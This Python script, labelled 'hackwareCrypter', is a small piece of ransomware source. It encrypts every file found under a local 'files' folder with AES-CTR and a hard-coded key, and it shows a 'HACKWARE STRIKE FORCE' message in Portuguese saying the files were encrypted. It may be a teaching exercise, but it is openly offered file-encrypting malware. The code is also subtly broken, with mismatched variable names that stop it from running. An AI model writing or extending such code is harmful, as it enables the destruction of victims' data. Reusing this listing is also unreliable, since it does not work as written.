#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES 
from Crypto.Util import Counter
import argparse
import os 
import Discovery
import Crypter

HARDCODED_KEY = 'hackware strike force strikes u!'

def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")
    parser.add_argument('-d', '--decrypt', help='descripta os arquivos [default: no]', action='store_true')
    
    return parser

def main ():
    parser  = get_parser()
    args    = vars(parser.parse_args()) 
    decrypt = args['decrypt']

    if decrypt:
        print('''

        HACKWARE STRIKE FORCE
        -------------------------------------
        Seus arquivos foram criptogrados
        Para descriptá-los utilize a seguinte senha '{}'
        '''.format(HARDCODED_KEY))
        key = input("Digite a sua senha: ")
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY 
    
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter = ctr)

    if not decrypt:
        crypt = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path]

    for currentDir in startDir:
        for filename in Discovery.discover(currentDir):
            Crypter.change_files(file_name, cryptFn)

    #limpeza da memoria

    for _ in range(100):
        pass

    if not decrypt:
        pass
        

if __name__ == '__main__':
    main()